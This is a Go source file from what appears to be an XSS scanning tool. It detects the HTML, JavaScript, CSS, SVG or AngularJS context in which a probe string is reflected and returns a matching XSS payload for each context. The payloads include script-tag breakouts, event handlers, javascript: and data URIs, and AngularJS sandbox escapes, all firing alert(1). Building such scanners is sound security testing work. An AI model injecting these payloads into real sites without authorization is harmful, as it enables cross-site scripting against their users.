package reflection

import (
	"strings"

	"github.com/lcalzada-xor/xxss/pkg/models"
)

// DetectContext analyzes the HTML around the probe to determine reflection context
func DetectContext(body, probe string) models.ReflectionContext {
	// Find first occurrence of probe
	index := strings.Index(body, probe)
	if index == -1 {
		return models.ContextUnknown
	}

	// Get surrounding context (500 chars before and after)
	start := max(0, index-500)
	end := min(len(body), index+len(probe)+500)
	context := body[start:end]

	// Check for AngularJS first (before other checks)
	if detectAngularJS(body) {
		if isInAngularTemplate(context, probe) {
			return models.ContextAngular
		}
	}

	// Check contexts in order of specificity
	if isInComment(context, probe) {
		return models.ContextComment
	}

	if isInMetaRefresh(context, probe) {
		return models.ContextMetaRefresh
	}

	if isInDataURI(context, probe) {
		return models.ContextDataURI
	}

	if isInSVG(context, probe) {
		return models.ContextSVG
	}

	if isInTemplateLiteral(context, probe) {
		return models.ContextTemplateLiteral
	}

	if isJS, jsContext := analyzeJavaScriptContext(context, probe); isJS {
		return jsContext
	}

	if isInCSS(context, probe) {
		return models.ContextCSS
	}

	if isInURL(context, probe) {
		return models.ContextURL
	}

	if isInTagName(context, probe) {
		return models.ContextTagName
	}

	if isInRCDATA(context, probe) {
		return models.ContextRCDATA
	}

	if isInAttribute(context, probe) {
		return models.ContextAttribute
	}

	// Default to HTML
	return models.ContextHTML
}

// DetectContextVerbose is like DetectContext but logs detailed information for debugging
func DetectContextVerbose(body, probe string, logger interface {
	VV(string, ...interface{})
	Detail(string, ...interface{})
}) models.ReflectionContext {
	// Find first occurrence of probe
	index := strings.Index(body, probe)
	if index == -1 {
		logger.Detail("Type: Unknown (probe not found)")
		return models.ContextUnknown
	}

	// Get surrounding context (500 chars before and after)
	start := max(0, index-500)
	end := min(len(body), index+len(probe)+500)
	context := body[start:end]

	// Get snippet around probe (±50 chars)
	snippetStart := max(0, index-50)
	snippetEnd := min(len(body), index+len(probe)+50)
	snippet := body[snippetStart:snippetEnd]
	// Truncate snippet for display
	if len(snippet) > 100 {
		snippet = snippet[:100] + "..."
	}

	// Check for AngularJS first (before other checks)
	if detectAngularJS(body) {
		if isInAngularTemplate(context, probe) {
			logger.Detail("Type: %s", models.ContextAngular)
			logger.VV("Snippet: %s", snippet)
			logger.Detail("Reason: Inside AngularJS template expression")
			return models.ContextAngular
		}
	}

	// Check contexts in order of specificity
	if isInComment(context, probe) {
		logger.Detail("Type: %s", models.ContextComment)
		logger.VV("Snippet: %s", snippet)
		logger.Detail("Reason: Inside HTML comment")
		return models.ContextComment
	}

	if isInMetaRefresh(context, probe) {
		logger.Detail("Type: %s", models.ContextMetaRefresh)
		logger.VV("Snippet: %s", snippet)
		logger.Detail("Reason: Inside meta refresh tag")
		return models.ContextMetaRefresh
	}

	if isInDataURI(context, probe) {
		logger.Detail("Type: %s", models.ContextDataURI)
		logger.VV("Snippet: %s", snippet)
		logger.Detail("Reason: Inside data URI")
		return models.ContextDataURI
	}

	if isInSVG(context, probe) {
		logger.Detail("Type: %s", models.ContextSVG)
		logger.VV("Snippet: %s", snippet)
		logger.Detail("Reason: Inside SVG element")
		return models.ContextSVG
	}

	if isInTemplateLiteral(context, probe) {
		logger.Detail("Type: %s", models.ContextTemplateLiteral)
		logger.VV("Snippet: %s", snippet)
		logger.Detail("Reason: Inside JavaScript template literal")
		return models.ContextTemplateLiteral
	}

	if isJS, jsContext := analyzeJavaScriptContext(context, probe); isJS {
		logger.Detail("Type: %s", jsContext)
		logger.VV("Snippet: %s", snippet)
		switch jsContext {
		case models.ContextJSSingleQuote:
			logger.Detail("Reason: Inside single-quoted JavaScript string")
		case models.ContextJSDoubleQuote:
			logger.Detail("Reason: Inside double-quoted JavaScript string")
		case models.ContextJSRaw:
			logger.Detail("Reason: Inside raw JavaScript code")
		default:
			logger.Detail("Reason: Inside JavaScript context")
		}
		return jsContext
	}

	if isInCSS(context, probe) {
		logger.Detail("Type: %s", models.ContextCSS)
		logger.VV("Snippet: %s", snippet)
		logger.Detail("Reason: Inside CSS style block")
		return models.ContextCSS
	}

	if isInURL(context, probe) {
		logger.Detail("Type: %s", models.ContextURL)
		logger.VV("Snippet: %s", snippet)
		logger.Detail("Reason: Inside URL attribute (href, src, etc.)")
		return models.ContextURL
	}

	if isInTagName(context, probe) {
		logger.Detail("Type: %s", models.ContextTagName)
		logger.VV("Snippet: %s", snippet)
		logger.Detail("Reason: Inside HTML tag name")
		return models.ContextTagName
	}

	if isInRCDATA(context, probe) {
		logger.Detail("Type: %s", models.ContextRCDATA)
		logger.VV("Snippet: %s", snippet)
		logger.Detail("Reason: Inside RCDATA element (title, textarea)")
		return models.ContextRCDATA
	}

	if isInAttribute(context, probe) {
		logger.Detail("Type: %s", models.ContextAttribute)
		logger.VV("Snippet: %s", snippet)
		logger.Detail("Reason: Inside HTML attribute value")
		return models.ContextAttribute
	}

	// Default to HTML
	logger.Detail("Type: %s", models.ContextHTML)
	logger.VV("Snippet: %s", snippet)
	logger.Detail("Reason: Default HTML context")
	return models.ContextHTML
}

// GetSuggestedPayload returns a context-specific XSS payload
func GetSuggestedPayload(context models.ReflectionContext, unfiltered []string) string {
	// Check which characters are available
	hasLt := contains(unfiltered, "<")
	hasGt := contains(unfiltered, ">")
	hasDquote := contains(unfiltered, "\"")
	hasSquote := contains(unfiltered, "'")
	hasQuote := hasDquote || hasSquote
	hasSpace := contains(unfiltered, " ")
	hasEquals := contains(unfiltered, "=")
	hasSlash := contains(unfiltered, "/")
	hasParen := contains(unfiltered, "(") && contains(unfiltered, ")")

	switch context {
	case models.ContextHTML:
		if hasLt && hasGt {
			if hasSpace && hasEquals {
				// XSS without quotes
				return "<img src=x onerror=alert(1)>"
			}
			if hasSlash {
				return "<script>alert(1)</script>"
			}
			return "<svg onload=alert(1)>"
		}

	case models.ContextJSSingleQuote:
		if hasSquote {
			return "';alert(1);//"
		}
		// Fallback if single quote is filtered but we are in single quote context (hard to exploit)

	case models.ContextJSDoubleQuote:
		if hasDquote {
			return "\";alert(1);//"
		}

	case models.ContextJSRaw:
		if hasParen {
			return ";alert(1);//"
		}
		return "alert(1)"

	case models.ContextJavaScript: // Deprecated fallback
		if hasSquote {
			return "';alert(1);//"
		}
		if hasDquote {
			return "\";alert(1);//"
		}
		if hasParen {
			return ";alert(1);//"
		}

	case models.ContextAttribute:
		// Priority 1: If we have < and >, break out of tag completely
		if hasGt && hasLt {
			if hasDquote {
				return "\"><script>alert(1)</script>"
			}
			if hasSquote {
				return "'><script>alert(1)</script>"
			}
			return "><script>alert(1)</script>"
		}
		// Priority 2: If we have quotes and space, use event handler
		if hasQuote && hasSpace {
			quote := "'"
			if hasDquote {
				quote = "\""
			}
			return quote + " onmouseover=" + quote + "alert(1)"
		}

	case models.ContextCSS:
		if hasParen {
			return "expression(alert(1))"
		}
		return "x:expression(alert(1))"

	case models.ContextTemplateLiteral:
		// Break out of template literal
		if contains(unfiltered, "$") && contains(unfiltered, "{") && contains(unfiltered, "}") {
			return "${alert(1)}"
		}
		if contains(unfiltered, "`") {
			return "`+alert(1)+`"
		}
		return "';alert(1);//"

	case models.ContextSVG:
		// SVG-specific XSS
		if hasLt && hasGt {
			return "<set attributeName=onmouseover value=alert(1)>"
		}
		if hasQuote && hasSpace {
			quote := "'"
			if hasDquote {
				quote = "\""
			}
			return quote + " onload=" + quote + "alert(1)"
		}
		return "<animate onbegin=alert(1)>"

	case models.ContextMetaRefresh:
		// Meta refresh URL injection
		return "javascript:alert(1)"

	case models.ContextDataURI:
		// Data URI XSS
		return "data:text/html,<script>alert(1)</script>"

	case models.ContextComment:
		if hasGt && hasLt {
			return "--><script>alert(1)</script><!--"
		}

	case models.ContextAngular:
		// AngularJS sandbox escape payloads
		hasDot := contains(unfiltered, ".")
		hasBracket := contains(unfiltered, "[") && contains(unfiltered, "]")

		if hasParen && hasDot {
			// Constructor-based escape (most reliable)
			return "{{constructor.constructor('alert(1)')()}}"
		}
		if hasBracket && hasParen && hasDot {
			// Array-based escape
			return "{{[].pop.constructor('alert(1)')()}}"
		}
		if hasDot {
			// $on-based escape (older Angular versions)
			return "{{$on.constructor('alert(1)')()}}"
		}
		// Fallback - simple expression
		return "{{alert(1)}}"

	case models.ContextURL:
		// Priority 1: Break out of tag (same as Attribute)
		if hasGt && hasLt {
			if hasDquote {
				return "\"><script>alert(1)</script>"
			}
			if hasSquote {
				return "'><script>alert(1)</script>"
			}
			return "><script>alert(1)</script>"
		}
		// Priority 2: Javascript protocol
		return "javascript:alert(1)"

	case models.ContextTagName:
		if hasGt && hasSpace && hasEquals {
			return " onload=alert(1)>"
		}
		if hasGt && hasLt {
			return "><script>alert(1)</script>"
		}

	case models.ContextRCDATA:
		if hasLt && hasGt && hasSlash {
			return "</title><script>alert(1)</script>" // Works for textarea too as generic closer
		}
	}

	return ""
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// detectAngularJS checks if the response contains AngularJS indicators
func detectAngularJS(body string) bool {
	indicators := []string{
		"ng-app",
		"ng-controller",
		"angular.js",
		"angular.min.js",
		"data-ng-app",
		"x-ng-app",
		"ng-bind",
		"ng-model",
	}

	bodyLower := strings.ToLower(body)
	for _, indicator := range indicators {
		if strings.Contains(bodyLower, indicator) {
			return true
		}
	}
	return false
}

// isInAngularTemplate checks if probe is inside AngularJS template syntax
func isInAngularTemplate(context, probe string) bool {
	// Look for probe inside {{ }} expressions
	beforeProbe := context[:strings.Index(context, probe)]
	afterProbe := context[strings.Index(context, probe)+len(probe):]

	// Count {{ and }} before probe
	openBraces := strings.Count(beforeProbe, "{{")
	closeBraces := strings.Count(beforeProbe, "}}")

	// If more {{ than }}, we're inside a template
	if openBraces > closeBraces {
		// Check if there's a closing }} after probe
		if strings.Contains(afterProbe, "}}") {
			return true
		}
	}

	// Also check if inside ng-* attributes
	if strings.Contains(beforeProbe, "ng-") {
		// Look for attribute value context
		lastQuote := strings.LastIndexAny(beforeProbe, "\"'")
		if lastQuote != -1 {
			// Check if there's a closing quote after probe
			if strings.ContainsAny(afterProbe, "\"'") {
				return true
			}
		}
	}

	return false
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
